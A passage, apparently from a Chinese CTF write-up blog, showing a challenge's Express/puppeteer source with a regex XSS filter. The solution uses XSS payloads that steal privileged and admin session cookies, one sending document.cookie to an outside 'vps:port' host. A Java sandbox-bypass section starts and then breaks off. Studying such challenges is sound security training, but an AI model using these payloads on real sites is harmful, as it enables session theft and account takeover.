class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> stringRandom = <span class="built_in">require</span>(<span class="string">&#x27;string-random&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">AdminPassWord</span>=<span class="title function_">stringRandom</span>(<span class="number">16</span>, &#123; <span class="attr">numbers</span>: <span class="literal">true</span> &#125;)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">PrivilegedPassWord</span>=<span class="title function_">stringRandom</span>(<span class="number">16</span>, &#123; <span class="attr">numbers</span>: <span class="literal">true</span> &#125;)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">PlainPassWord</span>=<span class="title function_">stringRandom</span>(<span class="number">16</span>, &#123; <span class="attr">numbers</span>: <span class="literal">true</span> &#125;)</span><br><span class="line"><span class="keyword">const</span> secret_key=<span class="title function_">stringRandom</span>(<span class="number">16</span>, &#123; <span class="attr">numbers</span>: <span class="literal">true</span> &#125;)</span><br><span class="line"><span class="keyword">const</span> users = [];</span><br><span class="line"><span class="keyword">const</span> posts = [];</span><br><span class="line"><span class="keyword">const</span> store = [];</span><br><span class="line">users.<span class="title function_">push</span>(&#123; <span class="attr">username</span>:<span class="string">&quot;admin&quot;</span>, <span class="attr">password</span>:<span class="title class_">AdminPassWord</span>, <span class="attr">role</span>: <span class="string">&quot;admin&quot;</span> &#125;);</span><br><span class="line">users.<span class="title function_">push</span>(&#123; <span class="attr">username</span>:<span class="string">&quot;privileged&quot;</span>, <span class="attr">password</span>:<span class="title class_">PrivilegedPassWord</span>, <span class="attr">role</span>: <span class="string">&quot;privileged&quot;</span> &#125;);</span><br><span class="line">users.<span class="title function_">push</span>(&#123; <span class="attr">username</span>:<span class="string">&quot;plain&quot;</span>, <span class="attr">password</span>:<span class="title class_">PlainPassWord</span>, <span class="attr">role</span>: <span class="string">&quot;plain&quot;</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(users)</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: secret_key,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123;</span><br><span class="line">        <span class="attr">httpOnly</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">secure</span>: <span class="literal">false</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;./index&#x27;</span>)(users,posts,store,<span class="title class_">AdminPassWord</span>,<span class="title class_">PrivilegedPassWord</span>));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App is running on http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#bot.<span class="property">js</span></span><br><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&#x27;puppeteer&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">triggerXSS</span>(<span class="params">UserName, PassWord</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">        <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>, <span class="string">&#x27;--disable-setuid-sandbox&#x27;</span>],</span><br><span class="line">        <span class="attr">executablePath</span>: <span class="string">&#x27;/usr/bin/chromium&#x27;</span>,</span><br><span class="line">        <span class="attr">headless</span>: <span class="literal">true</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://localhost:3000/login&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&#x27;input[name=&quot;username&quot;]&#x27;</span>, <span class="title class_">UserName</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&#x27;input[name=&quot;password&quot;]&#x27;</span>, <span class="title class_">PassWord</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&#x27;button[type=&quot;submit&quot;]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://localhost:3000/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123; triggerXSS &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">#index.<span class="property">js</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; triggerXSS &#125; = <span class="built_in">require</span>(<span class="string">&#x27;../bot&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Store</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isAuthenticated</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>) &#123;</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="function">(<span class="params">users,posts,store,AdminPassWord,PrivilegedPassWord</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">ROLES</span> = &#123;</span><br><span class="line">        <span class="attr">PLAIN</span>: <span class="string">&quot;plain&quot;</span>,</span><br><span class="line">        <span class="attr">PRIVILEGED</span>: <span class="string">&quot;privileged&quot;</span>,</span><br><span class="line">        <span class="attr">ADMIN</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(<span class="string">&#x27;register.html&#x27;</span>, &#123; <span class="attr">root</span>: <span class="string">&#x27;./views&#x27;</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; username, password, role &#125; = req.<span class="property">body</span>;</span><br><span class="line">        <span class="keyword">const</span> userExists = users.<span class="title function_">some</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> === username);</span><br><span class="line">        <span class="keyword">if</span> (userExists) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Username already exists!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        users.<span class="title function_">push</span>(&#123; username, password, <span class="attr">role</span>: <span class="string">&quot;plain&quot;</span> &#125;);</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(<span class="string">&#x27;login.html&#x27;</span>, &#123; <span class="attr">root</span>: <span class="string">&#x27;./views&#x27;</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(password);</span><br><span class="line">        <span class="keyword">const</span> user = users.<span class="title function_">find</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> === username &amp;&amp; u.<span class="property">password</span> === password);</span><br><span class="line">        <span class="keyword">if</span> (user) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">user</span> = user;</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;Invalid credentials!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> currentUser = req.<span class="property">session</span>.<span class="property">user</span>;</span><br><span class="line">        <span class="keyword">let</span> filteredPosts = [];</span><br><span class="line">        <span class="keyword">if</span> (currentUser.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">ADMIN</span>) &#123;</span><br><span class="line">            filteredPosts = posts.<span class="title function_">filter</span>(<span class="function"><span class="params">p</span> =&gt;</span> p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PRIVILEGED</span> || p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">ADMIN</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentUser.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PRIVILEGED</span>) &#123;</span><br><span class="line">            filteredPosts = posts.<span class="title function_">filter</span>(<span class="function"><span class="params">p</span> =&gt;</span> p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PLAIN</span> || p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PRIVILEGED</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filteredPosts = posts.<span class="title function_">filter</span>(<span class="function"><span class="params">p</span> =&gt;</span> p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PLAIN</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">`<span class="subst">$&#123;currentUser.role&#125;</span>`</span>, &#123; <span class="attr">posts</span>: filteredPosts, <span class="attr">user</span>: currentUser &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/post&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> &#123; content &#125; = req.<span class="property">body</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">const</span> scriptTagRegex = <span class="regexp">/&lt;script\b[^&lt;]*(?:(?!&lt;\/script&gt;)&lt;[^&lt;]*)*&lt;\/script&gt;/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(scriptTagRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> eventHandlerRegex = <span class="regexp">/on\w+\s*=\s*([&quot;&#x27;]).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(eventHandlerRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">const</span> javascriptURLRegex = <span class="regexp">/(?:href|src)\s*=\s*([&quot;&#x27;])\s*javascript:.*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(javascriptURLRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">const</span> dataURLRegex = <span class="regexp">/(?:href|src)\s*=\s*([&quot;&#x27;])\s*data:.*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dataURLRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">const</span> cssExpressionRegex = <span class="regexp">/style\s*=\s*([&quot;&#x27;]).*?expression\([^&gt;]*?\).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(cssExpressionRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">const</span> dangerousTagsRegex = <span class="regexp">/&lt;\/?(?:iframe|object|embed|link|meta|svg|base|source|form|input|video|audio|textarea|button|frame|frameset|applet)[^&gt;]*?&gt;/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousTagsRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">const</span> dangerousAttributesRegex = <span class="regexp">/\b(?:style|srcset|formaction|xlink:href|contenteditable|xmlns)\s*=\s*([&quot;&#x27;]).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousAttributesRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">const</span> dangerousProtocolsRegex = <span class="regexp">/(?:href|src)\s*=\s*([&quot;&#x27;])(?:\s*javascript:|vbscript:|file:|data:|filesystem:).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousProtocolsRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">const</span> dangerousFunctionsRegex = <span class="regexp">/\b(?:eval|alert|prompt|confirm|console\.log|Function)\s*\(/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousFunctionsRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">        posts.<span class="title function_">push</span>(&#123; <span class="attr">content</span>: content, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">username</span>, <span class="attr">role</span>: req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">role</span> &#125;);</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="title function_">destroy</span>();</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/report_admin&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">triggerXSS</span>(<span class="string">&quot;admin&quot;</span>,<span class="title class_">AdminPassWord</span>);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Admin Bot successfully logged in.`</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error Reporting:&#x27;</span>, error);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Admin Bot successfully logged in.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/report_privileged&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">triggerXSS</span>(<span class="string">&quot;privileged&quot;</span>,<span class="title class_">PrivilegedPassWord</span>);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Privileged Bot successfully logged in.`</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error Reporting:&#x27;</span>, error);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Privileged Bot successfully logged in.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/store&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(store);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/store&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">body</span>) &#123;</span><br><span class="line">            store.<span class="title function_">push</span>(req.<span class="property">body</span>);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&#x27;Data stored successfully&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;No data received&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> &amp;&amp; req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">role</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">                fs.<span class="title function_">readFile</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error reading flag file:&#x27;</span>, err);</span><br><span class="line">                        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal Server Error&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">`Your Flag Here: <span class="subst">$&#123;data&#125;</span>`</span>);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Unauthorized!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error fetching flag:&#x27;</span>, error);</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal Server Error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> router;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个题一眼xss嘛，然后有两种解题思路，一个是插入js代码利用/store路由，然后访问/report_privileged将privilege用户的cookie储存到/store中，然后同样的步骤再来一次获取admin的cookie</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">&#x27;/store&#x27;</span>,&#123;<span class="attr">body</span>:<span class="string">&quot;&#x27;&#x27;p&quot;</span>+<span class="string">`rivileged_cookie&#x27;&#x27;=`</span>+<span class="built_in">encodeURIComponent</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>),<span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,<span class="attr">headers</span>:&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;&#125;)&lt;/script</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者就是直接弹出privilege和admin的cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=document.location=&#x27;http://vps:port?cookie=&#x27;+document.cookie /&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="OnlineRunner"><a href="#OnlineRunner" class="headerlink" title="OnlineRunner"></a>OnlineRunner</h1><p>这道题没有办法用import的方式来导入类，能执行命令的都不能用，反射也没有办法直接执行命令，看别的师傅是要绕过一个沙箱</p>
+<p><a target="_blank" rel="noopener" href="https://vidar-team.feishu.cn/docx/AUvRdig4roPFOuxRvxAcpT81n9b">探索Java RASP Bypass新姿势</a></p>
+<p>这里我还是有点懵，直接贴别的师傅的payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span 